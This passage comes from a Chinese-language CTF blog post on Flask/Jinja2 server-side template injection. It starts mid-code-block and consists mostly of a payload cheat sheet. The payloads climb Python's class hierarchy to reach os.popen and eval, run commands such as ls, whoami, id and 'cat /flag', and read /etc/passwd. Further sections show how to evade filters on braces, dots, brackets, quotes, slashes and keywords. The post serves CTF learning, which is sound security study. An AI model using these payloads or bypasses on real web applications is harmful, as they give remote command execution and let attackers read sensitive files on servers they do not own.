</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{{[].</span><span class=n>__class__</span><span class=p>.</span><span class=n>__base__</span><span class=p>.</span><span class=nf>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>].</span><span class=n>__init__</span><span class=p>.</span><span class=n>func_globals</span><span class=p>.</span><span class=nf>keys</span><span class=p>()}}</span>
</span></span><span class=line><span class=cl><span class=p>{{[].</span><span class=n>__class__</span><span class=p>.</span><span class=n>__base__</span><span class=p>.</span><span class=nf>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>].</span><span class=n>__init__</span><span class=p>.</span><span class=n>func_globals</span><span class=p>.</span><span class=nf>values</span><span class=p>()[</span><span class=mi>13</span><span class=p>][</span><span class=err>&#39;</span><span class=n>eval</span><span class=err>&#39;</span><span class=p>](</span><span class=err>&#39;</span><span class=nf>__import__</span><span class=p>(</span><span class=s>&#34;os&#34;</span><span class=p>).</span><span class=nf>popen</span><span class=p>(</span><span class=s>&#34;ls&#34;</span><span class=p>).</span><span class=nf>read</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl><span class=cp># rce&#39;s result could be returned by curling 
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp># class site._Printer
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{{</span><span class=err>&#39;&#39;</span><span class=p>.</span><span class=n>__class__</span><span class=p>.</span><span class=n>__mro__</span><span class=p>[</span><span class=mi>2</span><span class=p>].</span><span class=nf>__subclasses__</span><span class=p>()[</span><span class=mi>71</span><span class=p>].</span><span class=n>__init__</span><span class=p>.</span><span class=n>__globals__</span><span class=p>[</span><span class=err>&#39;</span><span class=n>os</span><span class=err>&#39;</span><span class=p>].</span><span class=nf>listdir</span><span class=p>(</span><span class=sc>&#39;.&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp># type &#39;file&#39;
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{{</span><span class=err>&#39;&#39;</span><span class=p>.</span><span class=n>__class__</span><span class=p>.</span><span class=n>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=nf>__subclasses__</span><span class=p>()[</span><span class=n>xx</span><span class=p>](</span><span class=err>&#39;</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span><span class=err>&#39;</span><span class=p>).</span><span class=nf>read</span><span class=p>()}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp># WarningMessage -&gt; builtins -&gt; file
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{{</span><span class=err>&#39;&#39;</span><span class=p>.</span><span class=n>__class__</span><span class=p>.</span><span class=n>__mro__</span><span class=p>[</span><span class=mi>2</span><span class=p>].</span><span class=nf>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>].</span><span class=n>__init__</span><span class=p>.</span><span class=n>__globals__</span><span class=p>[</span><span class=err>&#39;</span><span class=n>__builtins__</span><span class=err>&#39;</span><span class=p>][</span><span class=err>&#39;</span><span class=n>file</span><span class=err>&#39;</span><span class=p>](</span><span class=err>&#39;</span><span class=nl>F</span><span class=p>:</span><span class=c1>//GetFlag.txt&#39;).read()}}
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp># WarningMessage -&gt; builtins -&gt; eval
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{{</span><span class=err>&#39;&#39;</span><span class=p>.</span><span class=n>__class__</span><span class=p>.</span><span class=n>__mro__</span><span class=p>[</span><span class=mi>2</span><span class=p>].</span><span class=nf>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>].</span><span class=n>__init__</span><span class=p>.</span><span class=n>__globals__</span><span class=p>[</span><span class=err>&#39;</span><span class=n>__builtins__</span><span class=err>&#39;</span><span class=p>][</span><span class=err>&#39;</span><span class=n>eval</span><span class=err>&#39;</span><span class=p>](</span><span class=err>&#39;</span><span class=nf>__import__</span><span class=p>(</span><span class=s>&#34;os&#34;</span><span class=p>).</span><span class=nf>popen</span><span class=p>(</span><span class=s>&#34;whoami&#34;</span><span class=p>).</span><span class=nf>read</span><span class=p>()</span><span class=err>&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp># class &#39;os._wrap_close&#39; -&gt; builtins -&gt; chr  ç”¨äºç»•è¿‡
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{</span><span class=o>%</span> <span class=n>set</span> <span class=n>chr</span><span class=o>=</span> <span class=err>&#39;</span><span class=sc>&#39;[&#39;</span><span class=n>_</span><span class=err>&#39;&#39;</span><span class=n>_cl</span><span class=err>&#39;&#39;</span><span class=n>ass_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_ba</span><span class=err>&#39;&#39;</span><span class=n>se_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_subcla</span><span class=err>&#39;&#39;</span><span class=n>sses_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>]()[</span><span class=mi>137</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_in</span><span class=err>&#39;&#39;</span><span class=n>it_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_glo</span><span class=err>&#39;&#39;</span><span class=n>bals_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_bui</span><span class=err>&#39;&#39;</span><span class=n>ltins_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=err>&#39;</span><span class=n>chr</span><span class=err>&#39;</span><span class=p>]</span><span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=n>set</span> <span class=n>cmd</span><span class=o>=</span><span class=err>&#39;</span><span class=n>cat</span> <span class=err>&#39;</span><span class=o>~</span><span class=nf>chr</span><span class=p>(</span><span class=mi>47</span><span class=p>)</span><span class=o>~</span><span class=err>&#39;</span><span class=n>flag</span><span class=err>&#39;</span> <span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp># class &#39;os._wrap_close&#39; -&gt; popen
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>{</span><span class=o>%</span><span class=nf>print</span><span class=p>(</span><span class=err>&#39;</span><span class=sc>&#39;[&#39;</span><span class=n>_</span><span class=err>&#39;&#39;</span><span class=n>_cl</span><span class=err>&#39;&#39;</span><span class=n>ass_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_ba</span><span class=err>&#39;&#39;</span><span class=n>se_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_subcla</span><span class=err>&#39;&#39;</span><span class=n>sses_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>]()[</span><span class=mi>137</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_in</span><span class=err>&#39;&#39;</span><span class=n>it_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=n>_glo</span><span class=err>&#39;&#39;</span><span class=n>bals_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=err>&#39;</span><span class=n>po</span><span class=err>&#39;&#39;</span><span class=n>pen</span><span class=err>&#39;</span><span class=p>](</span><span class=err>&#39;</span><span class=n>pwd</span><span class=err>&#39;</span><span class=p>)[</span><span class=err>&#39;</span><span class=n>rea</span><span class=err>&#39;</span><span class=sc>&#39;d&#39;</span><span class=p>]())</span><span class=o>%</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>æ¯”å¦‚ <code>[xx]</code> è¡¨ç¤º <code>__subclasses__</code> çš„ç¬¬xx+1ä¸ª</li><li>ä¸€èˆ¬å…ˆæ‰«ç›®å½•æ‰¾ flag ä½ç½®ï¼Œå†è¯» flag æ–‡ä»¶</li></ul><p>æ›´è‡ªåŠ¨çš„payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>{</span>% <span class=k>for</span> c in <span class=o>[]</span>.__class__.__base__.__subclasses__<span class=o>()</span> %<span class=o>}{</span>% <span class=k>if</span> c.__name__<span class=o>==</span><span class=s1>&#39;catch_warnings&#39;</span> %<span class=o>}{{</span> c.__init__.__globals__<span class=o>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=o>]</span>.eval<span class=o>(</span><span class=s2>&#34;__import__(&#39;os&#39;).popen(&#39;cd ..;ls;cat flag&#39;).read()&#34;</span><span class=o>)}}{</span>% endif %<span class=o>}{</span>% endfor %<span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{{</span> config.__class__.__init__.__globals__<span class=o>[</span><span class=s1>&#39;os&#39;</span><span class=o>]</span>.popen<span class=o>(</span><span class=s1>&#39;cat /flag | base64&#39;</span><span class=o>)</span>.read<span class=o>()}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># rce</span>
</span></span><span class=line><span class=cl><span class=o>{</span>% <span class=k>for</span> c in <span class=o>[]</span>.__class__.__base__.__subclasses__<span class=o>()</span> %<span class=o>}{</span>% <span class=k>if</span> c.__name__<span class=o>==</span><span class=s1>&#39;catch_warnings&#39;</span> %<span class=o>}{{</span> c.__init__.__globals__<span class=o>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=o>]</span>.eval<span class=o>(</span><span class=s2>&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;</span><span class=o>)</span> <span class=o>}}{</span>% endif %<span class=o>}{</span>% endfor %<span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># readfile</span>
</span></span><span class=line><span class=cl><span class=o>{</span>% <span class=k>for</span> c in <span class=o>[]</span>.__class__.__base__.__subclasses__<span class=o>()</span> %<span class=o>}{</span>% <span class=k>if</span> c.__name__<span class=o>==</span><span class=s1>&#39;catch_warnings&#39;</span> %<span class=o>}{{</span> c.__init__.__globals__<span class=o>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=o>]</span>.open<span class=o>(</span><span class=s1>&#39;filename&#39;</span>, <span class=s1>&#39;r&#39;</span><span class=o>)</span>.read<span class=o>()}}{</span>% endif %<span class=o>}{</span>% endfor %<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=ç»•è¿‡>ç»•è¿‡</h2><h3 id=-è¿‡æ»¤><code>{{}}</code> è¿‡æ»¤</h3><p>{%print 123%}<code>ç»•è¿‡</code>{}</p><h3 id=-è¿‡æ»¤-1><code>.</code> è¿‡æ»¤</h3><p>ä½¿ç”¨ JinJa2 å‡½æ•°<code>|attr()</code></p><ul><li>å°†<code>request.__class__</code>æ”¹æˆ<code>request|attr("__class__")</code></li></ul><p><code>['']</code> ç»•è¿‡<code>.</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{&#34;&#34;.__class__}}  =  {{&#34;&#34;[&#39;__class&#39;]}}
</span></span></code></pre></td></tr></table></div></div><h3 id=-è¿‡æ»¤-2><code>[]</code> è¿‡æ»¤</h3><p>pop å‡½æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()
</span></span></code></pre></td></tr></table></div></div><h3 id=-è¿‡æ»¤-3><code>"</code> è¿‡æ»¤</h3><p><code>request.args</code>Â æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨ GET path å‚æ•°ä¼ é€’è·¯å¾„</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd
</span></span></code></pre></td></tr></table></div></div><p><code>request.args</code>æ”¹ä¸º<code>request.values</code>åˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET:  
</span></span><span class=line><span class=cl>{{ &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;/etc/passwd&#39;).read() }}  
</span></span><span class=line><span class=cl>POST:  
</span></span><span class=line><span class=cl>class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
</span></span></code></pre></td></tr></table></div></div><h3 id=å…³é”®å­—è¿‡æ»¤>å…³é”®å­—è¿‡æ»¤</h3><p><code>__getattribute__</code> base64 ç¼–ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&#34;/etc/passwd&#34;).read()}}
</span></span></code></pre></td></tr></table></div></div><p>å­—ç¬¦ä¸²æ‹¼æ¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&#34;/etc/passwd&#34;).read()}}
</span></span></code></pre></td></tr></table></div></div><p>å…³é”®å­—ä¸­æ’å…¥ä¸€å¯¹å•å¼•å· <code>''</code>ï¼Œç»•è¿‡å¯¹å…³é”®å­—çš„é»‘åå•è¿‡æ»¤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Go data-lang=Go><span class=line><span class=cl><span class=nx>BaseCTF</span><span class=p>{</span><span class=o>%</span><span class=nb>print</span><span class=p>(</span><span class=err>&#39;</span><span class=sc>&#39;[&#39;</span><span class=nx>_</span><span class=err>&#39;&#39;</span><span class=nx>_cl</span><span class=err>&#39;&#39;</span><span class=nx>ass_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=nx>_ba</span><span class=err>&#39;&#39;</span><span class=nx>se_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>][</span><span class=sc>&#39;_&#39;</span><span class=err>&#39;</span><span class=nx>_subcla</span><span class=err>&#39;&#39;</span><span class=nx>sses_</span><span class=err>&#39;</span><span class=sc>&#39;_&#39;</span><span class=p>]()[</span><span class=mi>137</span><span class=p>])</span><span class=o>%</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=-è¿‡æ»¤-4><code>/</code> è¿‡æ»¤</h3><p>builtins çš„ chr å‡½æ•°</p><ul><li>chr(47) è¡¨ç¤º <code>/</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{% set chr= &#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;_&#39;&#39;_bui&#39;&#39;ltins_&#39;&#39;_&#39;][&#39;chr&#39;]%}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{% set cmd=&#39;cat &#39;~chr(47)~&#39;flag&#39; %}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;po&#39;&#39;pen&#39;](cmd)[&#39;rea&#39;&#39;d&#39;]())%}
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=å‚è€ƒ>å‚è€ƒ</h2><ul><li>å¾ˆæ¸…æ™°ä¸”åŸºç¡€çš„è®²è§£ï¼š <a class=link href=https://www.freebuf.com/column/187845.html target=_blank rel=noopener>ä»é›¶å­¦ä¹ flaskæ¨¡æ¿æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li><li>ä¸€äº›ä¾‹é¢˜ï¼š <a class=link href=https://www.extrader.top/posts/47d18edd/ target=_blank rel=noopener>CTF-SSTI | Extraderã®åšå®¢</a></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/web/>WEB</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 BU44ER's BLOG</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>